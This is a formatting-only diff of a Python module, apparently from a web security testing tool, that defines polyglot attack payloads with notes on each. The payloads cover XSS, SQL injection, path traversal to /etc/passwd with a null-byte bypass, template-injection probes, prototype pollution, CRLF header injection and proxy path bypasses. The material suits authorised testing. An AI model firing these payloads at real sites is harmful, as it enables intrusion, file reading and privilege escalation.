@@ -46,18 +46,19 @@ from typing import Dict, List
 @dataclass
 class Polyglot:
     """One polyglot payload with context-coverage metadata."""
-    name:    str
+
+    name: str
     payload: str
-    contexts: List[str]        # which interpretations are exploitable
-    notes:   str
+    contexts: List[str]  # which interpretations are exploitable
+    notes: str
     cwe_candidates: List[str]
 
     def to_dict(self) -> Dict:
         return {
-            "name":     self.name,
-            "payload":  self.payload,
+            "name": self.name,
+            "payload": self.payload,
             "contexts": self.contexts,
-            "notes":    self.notes,
+            "notes": self.notes,
             "cwe_candidates": self.cwe_candidates,
         }
 
@@ -72,9 +73,15 @@ _UNIVERSAL = Polyglot(
         "//\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
     ),
     contexts=[
-        "html-text", "html-attribute-double", "html-attribute-single",
-        "html-attribute-unquoted", "href-attribute", "js-string-double",
-        "js-string-single", "js-template-literal", "css-value",
+        "html-text",
+        "html-attribute-double",
+        "html-attribute-single",
+        "html-attribute-unquoted",
+        "href-attribute",
+        "js-string-double",
+        "js-string-single",
+        "js-template-literal",
+        "css-value",
     ],
     notes=(
         "The canonical polyglot from PortSwigger. Alternating case "
@@ -86,11 +93,10 @@ _UNIVERSAL = Polyglot(
 
 _SQL_PLUS_XSS = Polyglot(
     name="sqli_xss_reflected",
-    payload=(
-        "'+/**/UNION/**/SELECT/**/'<script>alert(1)</script>'+--+-"
-    ),
+    payload=("'+/**/UNION/**/SELECT/**/'<script>alert(1)</script>'+--+-"),
     contexts=[
-        "sql-string-literal", "html-text-post-sql",
+        "sql-string-literal",
+        "html-text-post-sql",
     ],
     notes=(
         "If sanitizer escapes SQL with addslashes() but then the result "
@@ -102,12 +108,12 @@ _SQL_PLUS_XSS = Polyglot(
 
 _LFI_RFI_UPLOAD = Polyglot(
     name="lfi_rfi_upload_filename",
-    payload=(
-        "../../../../etc/passwd%00.jpg"
-    ),
+    payload=("../../../../etc/passwd%00.jpg"),
     contexts=[
-        "lfi-path-traversal", "upload-extension-bypass",
-        "null-byte-truncation", "path-normalization",
+        "lfi-path-traversal",
+        "upload-extension-bypass",
+        "null-byte-truncation",
+        "path-normalization",
     ],
     notes=(
         "Combines path-traversal + null-byte extension-check bypass. "
@@ -119,11 +125,14 @@ _LFI_RFI_UPLOAD = Polyglot(
 
 _SSTI_CHAIN = Polyglot(
     name="ssti_engine_probe",
-    payload=(
-        "${{<%[%'\"}}%\\"
-    ),
+    payload=("${{<%[%'\"}}%\\"),
     contexts=[
-        "twig", "jinja2", "freemarker", "velocity", "smarty", "handlebars",
+        "twig",
+        "jinja2",
+        "freemarker",
+        "velocity",
+        "smarty",
+        "handlebars",
     ],
     notes=(
         "Syntactically-illegal in MOST template engines — whichever "
@@ -136,11 +145,11 @@ _SSTI_CHAIN = Polyglot(
 
 _JSON_BODY = Polyglot(
     name="json_body_injection",
-    payload=(
-        '{"role":"admin","__proto__":{"admin":true},"id":1,"admin":true}'
-    ),
+    payload=('{"role":"admin","__proto__":{"admin":true},"id":1,"admin":true}'),
     contexts=[
-        "json-merge", "prototype-pollution", "role-override",
+        "json-merge",
+        "prototype-pollution",
+        "role-override",
     ],
     notes=(
         "Prototype-pollution + role-override in a JSON body. Works "
@@ -152,11 +161,11 @@ _JSON_BODY = Polyglot(
 
 _HEADER = Polyglot(
     name="crlf_header_injection",
-    payload=(
-        "x\r\nSet-Cookie: amsw_probe=1\r\nX-Injected: 1"
-    ),
+    payload=("x\r\nSet-Cookie: amsw_probe=1\r\nX-Injected: 1"),
     contexts=[
-        "response-header-injection", "CRLF", "cookie-fixation",
+        "response-header-injection",
+        "CRLF",
+        "cookie-fixation",
     ],
     notes=(
         "If the target writes a user-controlled value into a response "
@@ -168,11 +177,10 @@ _HEADER = Polyglot(
 
 _PATH_BYPASS = Polyglot(
     name="path_normalization_bypass",
-    payload=(
-        "//admin/../admin/./settings?%2e%2e%2fbackdoor"
-    ),
+    payload=("//admin/../admin/./settings?%2e%2e%2fbackdoor"),
     contexts=[
-        "path-normalization-disagreement", "reverse-proxy-bypass",
+        "path-normalization-disagreement",
+        "reverse-proxy-bypass",
         "nginx-apache-parse-mismatch",
     ],
     notes=(
